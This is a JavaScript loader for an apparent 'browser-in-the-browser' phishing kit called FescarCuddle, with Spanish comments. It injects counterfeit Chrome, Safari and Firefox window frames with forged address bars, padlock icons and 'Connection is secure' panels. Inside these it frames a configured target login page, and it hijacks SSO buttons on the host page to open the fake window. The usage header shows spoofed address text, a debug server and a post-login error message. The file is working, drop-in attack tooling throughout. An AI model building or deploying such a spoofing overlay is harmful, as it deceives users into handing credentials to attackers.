/**
 * fescarcuddle-loader.js
 *
 * Drop-in loader. Usage on any page:
 *
 *   <script>
 *     window.appConfig = {
 *       iframeSrc:        "https://target.com/login",
 *       addressText:      "target.com/login",
 *       tabTitle:         "Login - Target",
 *       sitePanelMessage: "target.com",
 *       debugServerUrl:   "https://debug.securedevwarrior.com",
 *       matchUrl:         "/dashboard",
 *       matchIframeSrc:   "/autenticado.html",
 *       matchAddressText: "https://target.com/dashboard",
 *       matchTabTitle:    "Dashboard - Target",
 *       matchFavicon:     "/favicon.svg",
 *       matchHideDelay:   3,
 *       matchCloseMessage:"Error durante el proceso de autenticacion."
 *     };
 *   </script>
 *   <script src="https://your-server.com/fescarcuddle-loader.js"></script>
 *   <script>FescarCuddle.attach('.btn-sso');</script>
 */
(function () {
  'use strict';

  /* ─── 1. Base URL del loader (para resolver rutas de variante) ───────── */
  var _scriptSrc = (document.currentScript && document.currentScript.src) || '';
  var _baseUrl   = _scriptSrc ? _scriptSrc.replace(/\/[^/]*$/, '') : '';
  var _variantStorageKey = 'fescarcuddle.variant';
  var _allowedVariants = {
    'MacOS-Chrome': true,
    'MacOS-Safari': true,
    'Windows-Chrome': true,
    'Windows-Firefox': true,
    'MacOS-Chrome-LightMode': true,
    'MacOS-Chrome-DarkMode': true
  };

  function _abs(path) {
    return (_baseUrl ? _baseUrl : '') + '/' + path;
  }

  function _normalizeVariant(raw) {
    if (typeof raw !== 'string') return '';
    var value = raw.trim();
    if (!_allowedVariants[value]) return '';
    if (value === 'MacOS-Chrome-LightMode' || value === 'MacOS-Chrome-DarkMode') {
      return 'MacOS-Chrome';
    }
    return value;
  }

  function _readStoredVariant() {
    try {
      return _normalizeVariant(window.localStorage.getItem(_variantStorageKey) || '');
    } catch (err) {
      return '';
    }
  }

  /* ─── 2. Detectar variante ───────────────────────────────────────────── */
  var _ua      = navigator.userAgent || '';
  var _isMac   = /Mac|iPhone|iPad|iPod/.test(_ua) && !/Windows/.test(_ua);
  var _isSafari = /^((?!chrome|android|crios|fxios|edg).)*safari/i.test(_ua);
  var _isFirefox = /firefox|fxios/i.test(_ua);
  var _forcedVariantFromStorage = _readStoredVariant();
  var _forcedVariantFromConfig = (window.appConfig && typeof window.appConfig.variant === 'string')
    ? _normalizeVariant(window.appConfig.variant)
    : '';
  var _forcedVariant = _forcedVariantFromStorage || _forcedVariantFromConfig;
  var _variant = _forcedVariant || (_isMac && _isSafari ? 'MacOS-Safari' : (_isMac ? 'MacOS-Chrome' : (_isFirefox ? 'Windows-Firefox' : 'Windows-Chrome')));
  if (_variant === 'MacOS-Chrome-LightMode' || _variant === 'MacOS-Chrome-DarkMode') {
    _variant = 'MacOS-Chrome';
  }
  /* Recalculate _isMac in case variant was forced */
  _isMac = _variant.indexOf('MacOS') === 0;
  var _isSafariVariant = _variant.indexOf('MacOS-Safari') === 0;

  /* Exponer para que script.js lo use si lo necesita */
  window._isMac = _isMac;
  window._variantPath = '/' + _variant;

  /* ─── 3. Inyectar CSS de la variante ─────────────────────────────────── */
  var _link  = document.createElement('link');
  _link.rel  = 'stylesheet';
  _link.href = _abs(_variant + '/style.css');
  document.head.appendChild(_link);

  /* ─── 4. Inyectar HTML (Windows o MacOS) ─────────────────────────────── */
  var _html;

  if (_isSafariVariant) {
    _html = [
      '<div id="window" class="is-hidden" style="display:none">',
      '  <div id="title-bar-width">',
      '    <div id="title-bar" class="outer yosemite">',
      '      <div class="dots">',
      '        <div id="exit" class="dot red"></div>',
      '        <div id="minimize" class="dot amber"></div>',
      '        <div id="maximize" class="dot green"></div>',
      '      </div>',
      '      <span id="logo-description"></span>',
      '    </div>',
      '    <div id="url-bar">',
      '      <span id="ssl-padlock" aria-hidden="true"></span>',
      '      <span id="domain-name"></span>',
      '      <span id="domain-path"></span>',
      '    </div>',
      '  </div>',
      '  <iframe id="content" class="is-hidden" frameBorder="0"></iframe>',
      '</div>'
    ].join('\n');
  } else if (_isMac) {
    var _macFavicon = _abs(_variant + '/google.svg');
    _html = [
      '<div id="window" class="is-hidden" style="display:none">',
      '  <div id="browser-chrome">',
      '    <div id="title-bar" class="tab-row">',
      '      <div class="dots" aria-hidden="true">',
      '        <div id="exit" class="dot red"></div>',
      '        <div id="minimize" class="dot amber"></div>',
      '        <div id="maximize" class="dot green"></div>',
      '      </div>',
      '      <div class="tab-strip" aria-hidden="true">',
      '        <div id="active-tab" class="active-tab">',
      '          <img src="' + _macFavicon + '" class="tab-favicon" width="14" height="14" alt="">',
      '          <span class="tab-title" id="tab-title">New Tab</span>',
      '          <svg class="chrome-svg tab-close" viewBox="0 0 24 24"><path d="M7 7l10 10M17 7L7 17"></path></svg>',
      '        </div>',
      '        <button class="icon-button new-tab" type="button" aria-label="Nueva pestana"><svg class="chrome-svg" viewBox="0 0 24 24"><path d="M12 5v14M5 12h14"></path></svg></button>',
      '      </div>',
      '      <span id="logo-description"></span>',
      '    </div>',
      '    <div id="nav-bar" class="nav-row">',
      '      <div class="nav-actions" aria-hidden="true">',
      '        <button class="icon-button" type="button" aria-label="Atras"><svg class="chrome-svg" viewBox="0 0 24 24"><path d="M14.5 6.5L9 12l5.5 5.5"></path></svg></button>',
      '        <button class="icon-button" type="button" aria-label="Adelante"><svg class="chrome-svg" viewBox="0 0 24 24"><path d="M9.5 6.5L15 12l-5.5 5.5"></path></svg></button>',
      '        <button class="icon-button reload-btn" type="button" aria-label="Recargar"><svg class="chrome-svg reload-icon" viewBox="0 0 24 24"><path d="M20 11a8 8 0 1 0-2.34 5.66"></path><path d="M20 2v6h-6"></path></svg></button>',
      '      </div>',
      '      <div id="url-bar" class="omnibox">',
      '        <svg class="chrome-svg search-icon" viewBox="0 0 24 24" aria-hidden="true"><circle cx="11" cy="11" r="6"></circle><path d="M16 16l4 4"></path></svg>',
      '        <span id="ssl-padlock" aria-hidden="true"></span>',
      '        <span id="domain-name"></span><span id="domain-path"></span>',
      '        <svg class="chrome-svg star-icon" viewBox="0 0 24 24" aria-hidden="true"><path d="M12 3.6l2.6 5.3 5.8.8-4.2 4.1 1 5.8-5.2-2.7-5.2 2.7 1-5.8-4.2-4.1 5.8-.8z"></path></svg>',
      '      </div>',
      '      <div class="right-actions" aria-hidden="true"><span class="divider"></span><svg class="chrome-svg profile-icon" viewBox="0 0 24 24" aria-hidden="true"><circle class="profile-disc" cx="12" cy="12" r="10"></circle><circle class="profile-head" cx="12" cy="9" r="3"></circle><path class="profile-body" d="M6.8 18.2c.9-3 2.8-4.5 5.2-4.5s4.3 1.5 5.2 4.5"></path></svg><svg class="chrome-svg menu-icon" viewBox="0 0 24 24"><circle cx="12" cy="5" r="1.45"></circle><circle cx="12" cy="12" r="1.45"></circle><circle cx="12" cy="19" r="1.45"></circle></svg></div>',
      '    </div>',
      '  </div>',
      '  <iframe id="content" class="is-hidden" frameBorder="0"></iframe>',
      '</div>'
    ].join('\n');
  } else if (_variant === 'Windows-Firefox') {
    var _firefoxFavicon = _abs(_variant + '/firefox.png');
    _html = [
      '<div id="window" class="is-hidden" style="display:none">',
      '  <div id="tab-bar">',
      '    <button id="firefox-view-btn" class="toolbar-btn" type="button" aria-label="Firefox view"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M6.5 9.5h11a1.6 1.6 0 0 1 1.6 1.6v6.3a1.6 1.6 0 0 1-1.6 1.6h-11a1.6 1.6 0 0 1-1.6-1.6v-6.3a1.6 1.6 0 0 1 1.6-1.6z"></path><path d="M8.3 7h7.4"></path><path d="M10.2 5h3.6"></path><path d="M8.2 12.2h7.6"></path></svg></button>',
      '    <div id="tabs-area">',
      '      <div id="active-tab">',
      '        <img src="' + _firefoxFavicon + '" class="tab-favicon" id="fesc-favicon" width="16" height="16" alt="">',
      '        <span class="tab-title" id="tab-title">New Tab</span>',
      '        <span class="tab-close">&#10005;</span>',
      '      </div>',
      '      <button id="new-tab-btn" class="toolbar-btn" type="button" aria-label="Nueva pestana"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 5v14M5 12h14"></path></svg></button>',
      '    </div>',
      '    <button id="tab-list-btn" class="toolbar-btn" type="button" aria-label="Lista de pestanas"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M7 9l5 5 5-5"></path></svg></button>',
      '    <div id="window-controls"><span id="minimize"></span><span id="square"></span><span id="exit">&#10005;</span></div>',
      '  </div>',
      '  <div id="nav-bar">',
      '    <button id="sidebar-btn" class="nav-btn" type="button" aria-label="Panel lateral"><svg viewBox="0 0 24 24" aria-hidden="true"><rect x="5" y="7" width="14" height="10" rx="1.2"></rect><path d="M9.2 7v10"></path></svg></button>',
      '    <div id="nav-buttons">',
      '      <span class="nav-btn" id="btn-back"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M20 12H6"></path><path d="M11 7l-5 5 5 5"></path></svg></span>',
      '      <span class="nav-btn" id="btn-forward"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M4 12h14"></path><path d="M13 7l5 5-5 5"></path></svg></span>',
      '      <span class="nav-btn" id="btn-reload"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M20 11a8 8 0 1 0-2.34 5.66"></path><path d="M20 4v7h-7"></path></svg></span>',
      '    </div>',
      '    <div id="address-bar">',
      '      <div id="address-settings-btn"><svg class="shield-icon" viewBox="0 0 24 24" aria-hidden="true"><path d="M12 4.8l6 2.1v4.7c0 4.1-2.4 7.1-6 8.6-3.6-1.5-6-4.5-6-8.6V6.9z"></path><path d="M9.2 12.1l1.9 1.9 3.8-4"></path></svg><svg class="sliders-icon" viewBox="0 0 24 24" aria-hidden="true"><path d="M5.8 8h4.9"></path><circle cx="13.1" cy="8" r="1.35"></circle><path d="M14.6 8h3.6"></path><path d="M5.8 16h7.1"></path><circle cx="15.3" cy="16" r="1.35"></circle><path d="M16.8 16h1.4"></path></svg><svg class="address-caret" viewBox="0 0 24 24" aria-hidden="true"><path d="M8 10l4 4 4-4"></path></svg></div>',
      '      <div id="address-text"><span id="domain-name"></span></div>',
      '    </div>',
      '    <div id="browser-actions" aria-hidden="true">',
      '      <svg class="action-icon download-action" viewBox="0 0 24 24"><path d="M12 4v10"></path><path d="M8 10l4 4 4-4"></path><path d="M6 19h12"></path></svg>',
      '      <span class="vpn-badge"><span class="vpn-x">&#10005;</span>VPN<span class="vpn-dot"></span></span>',
      '      <svg class="action-icon profile-action" viewBox="0 0 24 24"><circle cx="12" cy="12" r="8.2"></circle><circle cx="12" cy="9.4" r="2.4"></circle><path d="M7.8 17c.8-2.4 2.3-3.6 4.2-3.6s3.4 1.2 4.2 3.6"></path></svg>',
      '      <svg class="action-icon extensions-action" viewBox="0 0 24 24"><path d="M9.2 5.2h4.5v4h3.8a2 2 0 0 1 2 2v3.2a2 2 0 0 1-2 2h-2.1v2.4H6.2v-4H3.8V9.2h5.4z"></path></svg>',
      '      <svg class="action-icon menu-icon" viewBox="0 0 24 24"><path d="M5 7h14M5 12h14M5 17h14"></path></svg>',
      '    </div>',
      '  </div>',
      '  <div id="site-info-panel" aria-hidden="true">',
      '    <div class="site-panel-header"><span class="site-panel-close" id="site-panel-close">&#10005;</span></div>',
      '    <div id="site-panel-message"></div>',
      '    <div class="site-panel-row"><div class="site-panel-left"><span class="site-panel-icon"><svg viewBox="0 0 24 24" fill="none"><path d="M7 10V8a5 5 0 1 1 10 0v2" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"/><rect x="5" y="10" width="14" height="11" rx="2" stroke="currentColor" stroke-width="2.2"/></svg></span><span>Connection is secure</span></div><span class="site-panel-chevron">&#8250;</span></div>',
      '    <div class="site-panel-divider"></div>',
      '    <div class="site-panel-row"><div class="site-panel-left"><span class="site-panel-icon"><svg viewBox="0 0 24 24" fill="none"><path d="M12 4a4 4 0 0 0-4 4v4.8L6 15v1h12v-1l-2-2.2V8a4 4 0 0 0-4-4z" stroke="currentColor" stroke-width="2.2" stroke-linejoin="round"/><path d="M10.5 18a1.5 1.5 0 0 0 3 0" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"/></svg></span><span>Notifications</span></div><div class="site-toggle"><span class="site-toggle-knob"></span></div></div>',
      '    <button class="site-panel-action" type="button">Reset permission</button>',
      '    <div class="site-panel-divider"></div>',
      '    <div class="site-panel-row"><div class="site-panel-left"><span class="site-panel-icon"><svg viewBox="0 0 24 24" fill="none"><path d="M10.8 3h2.4l.5 2.1a7.2 7.2 0 0 1 1.8.8l1.9-1 1.7 1.7-1 1.9a7.2 7.2 0 0 1 .8 1.8L21 10.8v2.4l-2.1.5a7.2 7.2 0 0 1-.8 1.8l1 1.9-1.7 1.7-1.9-1a7.2 7.2 0 0 1-1.8-.8L13.2 21h-2.4l-.5-2.1a7.2 7.2 0 0 1-1.8-.8l-1.9 1-1.7-1.7 1-1.9a7.2 7.2 0 0 1-.8-1.8L3 13.2v-2.4l2.1-.5a7.2 7.2 0 0 1 .8-1.8l-1-1.9 1.7-1.7 1.9 1a7.2 7.2 0 0 1 1.8-.8L10.8 3z" stroke="currentColor" stroke-width="2.2" stroke-linejoin="round"/><circle cx="12" cy="12" r="2.6" stroke="currentColor" stroke-width="2.2"/></svg></span><span>Site settings</span></div><span class="site-panel-chevron">&#8599;</span></div>',
      '  </div>',
      '  <div id="firefox-sidebar" aria-hidden="true">',
      '    <div class="sidebar-icons">',
      '      <span class="sidebar-import"><svg viewBox="0 0 24 24"><path d="M5 12h10"></path><path d="M11 8l4 4-4 4"></path><path d="M6 5h11a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2H6"></path></svg><span>Import bookmarks...</span></span>',
      '      <span class="sidebar-icon"><svg viewBox="0 0 24 24"><rect x="6" y="8" width="12" height="8" rx="1.2"></rect><path d="M9.2 8v8"></path></svg></span>',
      '      <span class="sidebar-icon has-dot"><svg viewBox="0 0 24 24"><path d="M12.2 7.2l1.6 3.4 3.4 1.6-3.4 1.6-1.6 3.4-1.6-3.4-3.4-1.6 3.4-1.6z"></path><path d="M5.8 3.8v3.4"></path><path d="M4.1 5.5h3.4"></path><path d="M6.5 16.2v2.8"></path><path d="M5.1 17.6h2.8"></path></svg></span>',
      '      <span class="sidebar-icon"><svg viewBox="0 0 24 24"><rect x="7.2" y="6.8" width="9.6" height="7.2" rx="1.1"></rect><path d="M10.2 14v2.4h3.6V14"></path><path d="M8.2 17.2h7.6"></path><path d="M16.8 11.2h1.4a1.2 1.2 0 0 1 1.2 1.2v3.8a1.2 1.2 0 0 1-1.2 1.2h-1.4"></path></svg></span>',
      '      <span class="sidebar-icon"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="7"></circle><path d="M12 8v4l2.8 2"></path></svg></span>',
      '      <span class="sidebar-icon"><svg viewBox="0 0 24 24"><path d="M12 4.3l2.3 4.6 5 .7-3.6 3.5.9 5-4.6-2.4-4.6 2.4.9-5-3.6-3.5 5-.7z"></path></svg></span>',
      '    </div>',
      '    <span class="sidebar-icon sidebar-settings"><svg viewBox="0 0 24 24"><path d="M10.7 4h2.6l.5 2.1c.6.2 1.1.4 1.6.7l1.9-1 1.8 1.8-1 1.9c.3.5.5 1 .7 1.6l2.2.5v2.6l-2.2.5c-.2.6-.4 1.1-.7 1.6l1 1.9-1.8 1.8-1.9-1c-.5.3-1 .5-1.6.7l-.5 2.1h-2.6l-.5-2.1c-.6-.2-1.1-.4-1.6-.7l-1.9 1-1.8-1.8 1-1.9c-.3-.5-.5-1-.7-1.6L3 14.2v-2.6l2.2-.5c.2-.6.4-1.1.7-1.6l-1-1.9 1.8-1.8 1.9 1c.5-.3 1-.5 1.6-.7z"></path><circle cx="12" cy="12.9" r="2.7"></circle></svg></span>',
      '  </div>',
      '  <iframe id="content" class="is-hidden" frameBorder="0"></iframe>',
      '</div>'
    ].join('\n');
  } else {
    var _favicon = _abs(_variant + '/google.svg');
    _html = [
      '<div id="window" class="is-hidden" style="display:none">',
      '  <div id="tab-bar">',
      '    <button id="tab-search-btn" type="button">',
      '      <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">',
      '        <path d="M7 10l5 5 5-5" stroke="currentColor" stroke-width="2.9" stroke-linecap="round" stroke-linejoin="round"/>',
      '      </svg>',
      '    </button>',
      '    <div id="tabs-area">',
      '      <div id="active-tab">',
      '        <img src="' + _favicon + '" class="tab-favicon" id="fesc-favicon" width="16" height="16">',
      '        <span class="tab-title" id="tab-title"></span>',
      '        <span class="tab-close">&#10005;</span>',
      '      </div>',
      '    </div>',
      '    <div id="window-controls">',
      '      <span id="minimize">&#8212;</span>',
      '      <span id="square">&#9633;</span>',
      '      <span id="exit">&#10005;</span>',
      '    </div>',
      '  </div>',
      '  <div id="nav-bar">',
      '    <div id="nav-buttons">',
      '      <span class="nav-btn" id="btn-back"><svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg></span>',
      '      <span class="nav-btn" id="btn-forward"><svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z"/></svg></span>',
      '      <span class="nav-btn" id="btn-reload"><svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M17.65 6.35C16.2 4.9 14.21 4 12 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08c-.82 2.33-3.04 4-5.65 4-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"/></svg></span>',
      '    </div>',
      '    <div id="address-bar">',
      '      <div id="address-settings-btn">',
      '        <svg viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">',
      '          <path d="M4.5 6.5H15.5" stroke="currentColor" stroke-width="1.6" stroke-linecap="round"/>',
      '          <circle cx="8" cy="6.5" r="1.7" stroke="currentColor" stroke-width="1.6" fill="white"/>',
      '          <path d="M4.5 13.5H15.5" stroke="currentColor" stroke-width="1.6" stroke-linecap="round"/>',
      '          <circle cx="12" cy="13.5" r="1.7" stroke="currentColor" stroke-width="1.6" fill="white"/>',
      '        </svg>',
      '      </div>',
      '      <div id="address-text"><span id="domain-name"></span></div>',
      '      <span class="nav-btn" id="btn-bookmark"><svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M22 9.24l-7.19-.62L12 2 9.19 8.63 2 9.24l5.46 4.73-1.64 7.03L12 17.27l6.18 3.73-1.63-7.03L22 9.24zM12 15.4l-3.76 2.27 1-4.28-3.32-2.88 4.38-.38L12 6.1l1.71 4.04 4.38.38-3.32 2.88 1 4.28L12 15.4z"/></svg></span>',
      '    </div>',
      '  </div>',
      '  <div id="site-info-panel" aria-hidden="true">',
      '    <div class="site-panel-header"><span class="site-panel-close" id="site-panel-close">&#10005;</span></div>',
      '    <div id="site-panel-message"></div>',
      '    <div class="site-panel-row"><div class="site-panel-left"><span class="site-panel-icon"><svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M7 10V8a5 5 0 1 1 10 0v2" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"/><rect x="5" y="10" width="14" height="11" rx="2" stroke="currentColor" stroke-width="2.2"/></svg></span><span>Connection is secure</span></div><span class="site-panel-chevron">&#8250;</span></div>',
      '    <div class="site-panel-divider"></div>',
      '    <div class="site-panel-row"><div class="site-panel-left"><span class="site-panel-icon"><svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 4a4 4 0 0 0-4 4v4.8L6 15v1h12v-1l-2-2.2V8a4 4 0 0 0-4-4z" stroke="currentColor" stroke-width="2.2" stroke-linejoin="round"/><path d="M10.5 18a1.5 1.5 0 0 0 3 0" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"/></svg></span><span>Notifications</span></div><div class="site-toggle"><span class="site-toggle-knob"></span></div></div>',
      '    <button class="site-panel-action" type="button">Reset permission</button>',
      '    <div class="site-panel-divider"></div>',
      '    <div class="site-panel-row"><div class="site-panel-left"><span class="site-panel-icon"><svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M10.8 3h2.4l.5 2.1a7.2 7.2 0 0 1 1.8.8l1.9-1 1.7 1.7-1 1.9a7.2 7.2 0 0 1 .8 1.8L21 10.8v2.4l-2.1.5a7.2 7.2 0 0 1-.8 1.8l1 1.9-1.7 1.7-1.9-1a7.2 7.2 0 0 1-1.8-.8L13.2 21h-2.4l-.5-2.1a7.2 7.2 0 0 1-1.8-.8l-1.9 1-1.7-1.7 1-1.9a7.2 7.2 0 0 1-.8-1.8L3 13.2v-2.4l2.1-.5a7.2 7.2 0 0 1 .8-1.8l-1-1.9 1.7-1.7 1.9 1a7.2 7.2 0 0 1 1.8-.8L10.8 3z" stroke="currentColor" stroke-width="2.2" stroke-linejoin="round"/><circle cx="12" cy="12" r="2.6" stroke="currentColor" stroke-width="2.2"/></svg></span><span>Site settings</span></div><span class="site-panel-chevron">&#8599;</span></div>',
      '  </div>',
      '  <iframe id="content" class="is-hidden" frameBorder="0"></iframe>',
      '</div>'
    ].join('\n');
  }

  /* Tambien el div de mensaje de cierre que usa script.js */
  _html += [
    '<div id="match-close-message" style="',
    '  display:none;position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);',
    '  max-width:480px;width:calc(100% - 48px);background:#1c1f26;',
    '  border:1px solid #3a2222;border-left:4px solid #c0392b;border-radius:10px;',
    '  padding:24px 28px;box-shadow:0 8px 32px rgba(0,0,0,.55);color:#e8eaed;',
    '  font-family:\'Segoe UI\',system-ui,sans-serif;font-size:.9rem;',
    '  line-height:1.6;z-index:9999;white-space:pre-wrap;">',
    '</div>'
  ].join('');

  var _wrap = document.createElement('div');
  _wrap.innerHTML = _html;
  document.body.appendChild(_wrap);

  /* ─── 5. API publica — definida sincrona para que este disponible al instante ── */
  window.FescarCuddle = {
    show: function () {
      if (window.FescarCuddleCore) window.FescarCuddleCore.show();
    },
    hide: function () {
      if (window.FescarCuddleCore) window.FescarCuddleCore.hide();
    },
    attach: function (target) {
      var els;
      if (typeof target === 'string') {
        els = Array.prototype.slice.call(document.querySelectorAll(target));
      } else if (target && target.nodeType) {
        els = [target];
      } else if (target && typeof target.length === 'number') {
        els = Array.prototype.slice.call(target);
      } else {
        return;
      }
      els.forEach(function (el) {
        el.addEventListener('click', function (e) {
          e.preventDefault();
          window.FescarCuddle.show();
        });
      });
    }
  };

  /* ─── 6. Cargar jQuery (si no esta) y luego script.js ────────────────── */
  function _loadScript(src, cb) {
    var s = document.createElement('script');
    s.src = src;
    s.onload = cb || null;
    document.head.appendChild(s);
  }

  function _loadScriptJs() {
    _loadScript(_abs('script.js'));
  }

  if (window.jQuery) {
    _loadScriptJs();
  } else {
    _loadScript(
      'https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js',
      _loadScriptJs
    );
  }

})();
